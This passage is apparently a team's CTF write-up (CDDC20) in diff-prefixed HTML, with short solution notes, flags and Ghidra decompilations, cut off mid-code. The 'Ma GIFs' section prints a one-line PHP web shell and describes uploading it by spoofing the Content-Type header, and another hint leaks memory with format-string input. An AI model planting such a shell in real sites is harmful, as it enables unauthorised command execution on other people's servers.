+&lt;p&gt;Reverse Search Image in Yandex reveal that this is a Dancing Men Cipher. Decrypt the image to obtain the flag.&lt;/p&gt;
+&lt;h3&gt;[Misc-3] Add to Your Reading List&lt;/h3&gt;
+&lt;p&gt;Annotated PDF have bolded text in some pages, combine all of them to obtain flag&lt;/p&gt;
+&lt;h3&gt;[Web-3] Keep Me Posted&lt;/h3&gt;
+&lt;p&gt;Send a post request to website with Authorization header set to the base64 of “Yes”&lt;/p&gt;
+&lt;h3&gt;[OSINT-3] Transparency is the Best&lt;/h3&gt;
+&lt;p&gt;My teammate Jun Yan discovered the website &lt;code class=&quot;language-text&quot;&gt;tt7ncdhj367dh8mu2pb6.unduplicitouscorp.tech&lt;/code&gt; by using a internet tools to find subdomains, under this domain there is a &lt;code class=&quot;language-text&quot;&gt;flag.tt7ncdhj367dh8mu2pb6.unduplicitouscorp.tech&lt;/code&gt; which result in the flag.
+&lt;a href=&quot;https://borysek.eu/ct/&quot;&gt;Subdomain Finder&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;[RE (Windows)-1] Decompile Me (Unsolved)&lt;/h3&gt;
+&lt;p&gt;Use tools such as &lt;a href=&quot;https://github.com/matiasb/unpy2exe&quot;&gt;unpy2exe&lt;/a&gt;. Couldn’t get it working.&lt;/p&gt;
+&lt;h3&gt;[Forensics-3] Top Secret&lt;/h3&gt;
+&lt;p&gt;TopSecret is a .ad1 file, can be view in FTK Imager software and flag is hidden in a text file with lorem texts. &lt;/p&gt;
+&lt;h3&gt;[Pwn (Linux)-3] Find Singapore Bug&lt;/h3&gt;
+&lt;p&gt;FSB also known as Format String Bug, able to leak out flag by inputting many &lt;code class=&quot;language-text&quot;&gt;%x&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;%c&lt;/code&gt;. Swap Endianess to obtain the flag&lt;/p&gt;
+&lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;WARP GATE FOUR&lt;/h2&gt;
+&lt;h3&gt;Visual Noise&lt;/h3&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-f7a2c.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 13.958560523446021%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAD0lEQVQI12NooAAwDJhmAC2XWgG6izzhAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Visual Noise 1&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-48538.png&quot;
+        srcset=&quot;/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-bed0f.png 200w,
+/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-5fd34.png 400w,
+/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-48538.png 800w,
+/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-b70ec.png 1200w,
+/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-d134a.png 1600w,
+/static/Visual_Noise-0ec6ae0ccba7aa6e9a5726b186bcde9e-f7a2c.png 1834w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    
+
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-f7a2c.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 13.958560523446021%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAD0lEQVQI12NooAAwDJhmAC2XWgG6izzhAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Visual Noise 2&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-48538.png&quot;
+        srcset=&quot;/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-bed0f.png 200w,
+/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-5fd34.png 400w,
+/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-48538.png 800w,
+/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-b70ec.png 1200w,
+/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-d134a.png 1600w,
+/static/Visual_Noise_2-aa685b5a77aae415cc85ae0dcb8048d3-f7a2c.png 1834w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;Use different image checker.
+&lt;a href=&quot;https://www.diffchecker.com/diff&quot;&gt;https://www.diffchecker.com/diff&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{V1suA1_CrYPT0_iS_s0_53cuRE}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;[OSINT-1] Funky Transfer Pact (Unsolved)&lt;/h3&gt;
+&lt;h3&gt;Recycling Bin&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;1.img&lt;/code&gt; is mountable file, mount it to extract the content. In the folder, there is a test.zip which is an excel file document. Rename test.zip to test.xlsx to obtain the flag.&lt;/p&gt;
+&lt;h3&gt;How QueeR…&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/barcode-df90bf8d0533e5757ea1fede8743adbc.gif&quot; alt=&quot;Maxicode&quot;&gt;&lt;/p&gt;
+&lt;p&gt;A Maxicode QR Code, invert the image and use online decoder&lt;/p&gt;
+&lt;h3&gt;Great Sphinx of Unduplicitous Corp (Unsolved)&lt;/h3&gt;
+&lt;h3&gt;Ma GIFs&lt;/h3&gt;
+&lt;p&gt;We were given a website where we can upload GIF&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Ma_GIF-6ed3c0a03def60db6f1a3d46ff12a8b9-edd43.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 500px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 48.199999999999996%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsSAAALEgHS3X78AAABMUlEQVQoz41Ri46CMBD0/7/uFJWoCPJqaYsPpC+KyE17uUu8eMlNwnbp7Oy028X8ivv9frlceim7rhOi7fteCHHrbvM7LL4W55zW2lpbFsXhcCiKIs/z9HjMAsqyNNZIpUY3voifzycWOFBKOReUEpQWpRfXdY08zVJEzhk2ldYvYpxTG62khLMbXdu2p1MG5zT1GkpIVZVCcM86p5Q2xqiQezFHTziCZxxKuG02m+XyYxvHq9UqiqL1ek2bBjVoBBYTwa+U0osJIaBCpIxx8Hl+2u92u/0+juMkSeBfVTVjDPdCd7QglD4eDy/GkEzATzJYCwec/JgkiINz5huo0SGZwqQWb99gGCxMrtcbque/8Vs8jiNuFebAm6bhgp/PZ2z+S4yXGzys/wKQTNP0VvwJbHs4DTMge48AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Ma GIF Website&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Ma_GIF-6ed3c0a03def60db6f1a3d46ff12a8b9-edd43.png&quot;
+        srcset=&quot;/static/Ma_GIF-6ed3c0a03def60db6f1a3d46ff12a8b9-1c603.png 200w,
+/static/Ma_GIF-6ed3c0a03def60db6f1a3d46ff12a8b9-bb811.png 400w,
+/static/Ma_GIF-6ed3c0a03def60db6f1a3d46ff12a8b9-edd43.png 500w&quot;
+        sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;The website has File Upload Vulnerability, you are able to upload a simple backdoor code by modifying the Content-Type header.&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Ma_GIF_2-8e7cce393fcc46ffed2e2f4137bd3264-a3454.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 69.62962962962963%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACNklEQVQ4y3VTiXLqMAzM//9cSymUO5RA7sOxkxBysF2Zo8ybvszsSLaj1cqWnN0uxH7vES52ux3CMESeZwiCAGVZoq5rGGOglLJr8WVvHEdcr9cn5Dufz3DW65RkCVzXh+d52G5vpEVRWBKxWmtUVWXJLpfLk+Dfr64bOItFRGUpiTwSfiNJYiKhypyKtFXzqqJpzlapJBHIf23b/hJ6hwK+XyIMMh5SQduj7zt0VNJ3RN+j6zrgOjLkylIHu/eAnI3D8EuY5jUEcVohy0soZg+p8hTECGNNJPBOJyjdwlQjTD3iRv2L8V5y1ZAw3BwQu0dELsv9/kZ5PEKTQPsBqjiF4ePYdRBBhzHU0YeJIp7FFob3Lf/UtBLv6NUSxecU+ceE+EAmmEyQvb+jmM+Qz2ZI397seUHf7n1+Ip9Ob1b2lkuY7RbRbA6nZKuo9QbFYgHtujCHg4Xe72GYUfasL/vsAvm/ZLCsa1FmEaJjRyiqdPL5HIoZBFrIVytkzCxW1uUdhqQVSz+zAzq2UM/7GuThxPKVr3wcnWVwLAHlp+8TW0Lx9QVFteV6bf2aqoRMlIqyhirqB3wfDe9RVF7SFDkTOhWlS3C5WVtVgpSqU5Il0w8ktBETvpYq9hazeV5PRcSMdTLpv7hAFitK5nQwY+gdcDr4iE58ZaPZLhXG/0wH7q3z7MOzqdDSaZRGy9FqGSyToOzc1nYaZASHe/O+jt3Df9ha+vCvjBI8DL21j4l4Df4LD4U/y48lC8L4TX0AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Ma GIF Upload&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Ma_GIF_2-8e7cce393fcc46ffed2e2f4137bd3264-48538.png&quot;
+        srcset=&quot;/static/Ma_GIF_2-8e7cce393fcc46ffed2e2f4137bd3264-bed0f.png 200w,
+/static/Ma_GIF_2-8e7cce393fcc46ffed2e2f4137bd3264-5fd34.png 400w,
+/static/Ma_GIF_2-8e7cce393fcc46ffed2e2f4137bd3264-48538.png 800w,
+/static/Ma_GIF_2-8e7cce393fcc46ffed2e2f4137bd3264-a3454.png 810w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
+      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;?php &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;/pre&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; system&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ?&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;After uploading the backdoor, we can execute our commands in the url.&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Ma_GIF_3-9aaec22cfd3be9e4d2ea7cb765aff22b-dc1c0.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 25.573314801945795%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA9UlEQVQY06WO3W6CMBiGub1NN0VR2ZbNnRiPdoVmXgAQOBhkBggk/DcuRDjgN/CubZw3sCZPnvbN174VdvsPbN/3eN3uIG3esFo+YyG9cGbiE+aiDJFms/ka4kKm5w3Ppo8ryhr3Uwl3kyUmDxKdlyE4jgPTNOH7Ps4/Z5AsAyEEYRgiimMEQYAoipGmKc+Zs+tMURS4XApUVYWyLDnC8fiJw+EAXdfpw19QVRWapkFRFG7DMCg6vk8neJ4H13V5OSsiJEN8LWUfSJIEgmVZYNi2jTzP0bYt+r7ndF13M8uZ/2ia5kZd1xy2F8ZxxDAM/CLzf9cv+dxUu7EWCvMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Ma GIF Backdoor&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Ma_GIF_3-9aaec22cfd3be9e4d2ea7cb765aff22b-48538.png&quot;
+        srcset=&quot;/static/Ma_GIF_3-9aaec22cfd3be9e4d2ea7cb765aff22b-bed0f.png 200w,
+/static/Ma_GIF_3-9aaec22cfd3be9e4d2ea7cb765aff22b-5fd34.png 400w,
+/static/Ma_GIF_3-9aaec22cfd3be9e4d2ea7cb765aff22b-48538.png 800w,
+/static/Ma_GIF_3-9aaec22cfd3be9e4d2ea7cb765aff22b-b70ec.png 1200w,
+/static/Ma_GIF_3-9aaec22cfd3be9e4d2ea7cb765aff22b-dc1c0.png 1439w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;h3&gt;ilovedes&lt;/h3&gt;
+&lt;p&gt;Use des decryptor tool online, key is “ilovedes”
+&lt;a href=&quot;http://des.online-domain-tools.com/&quot;&gt;DES decryptor tool&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{i_l0v3_5yMmetR1c_EnCryp7i0N}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Secret Code (Unsolved)&lt;/h3&gt;
+&lt;p&gt;Using Ghidra, a free and open source reverse engineering tool. It was able to reconstruct some of the source code back, however we were not sure on how to go on from here.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;
+      &lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */&lt;/span&gt;
+
+undefined4 &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  undefined4 uVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; in_GS_OFFSET&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_18&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_14&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_10&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  
+  local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0x00000004&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  local_14 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;in_GS_OFFSET &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  local_18 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;         __                                     _           &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; / / _   ) )     _   ) o  _ o _)_ _       _    / ` _   _ _  &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;(_/ ) ) /_/ (_( )_) (  ( (_ ( (_ (_) (_( (    (_. (_) ) )_) &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;               (                         _)            (    \n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[S][E][C][R][E][T] [C][O][D][E]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_000109b2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;local_18&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_18 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xff23502&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token function&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xf00dcafe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token function&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_18&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+  uVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_14 &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;in_GS_OFFSET &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    uVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;__stack_chk_fail_local&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; uVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;h3&gt;Something’s Going On (Unsolved)&lt;/h3&gt;
+&lt;h3&gt;What Time Is It? &lt;a href=&quot;Unsolved&quot;&gt;1&lt;/a&gt;&lt;/h3&gt;
+&lt;h3&gt;Suspicious Service (Unsolved)&lt;/h3&gt;
+&lt;p&gt;Using Ghidra, a free and open source reverse engineering tool. It was able to reconstruct some of the source code back, however we were not sure on how to go on from here.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;
+      &lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */&lt;/span&gt;
+
+undefined4 &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  undefined local_10c &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  
+  &lt;span class=&quot;token function&quot;&gt;FUN_00011090&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token function&quot;&gt;FUN_00011090&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
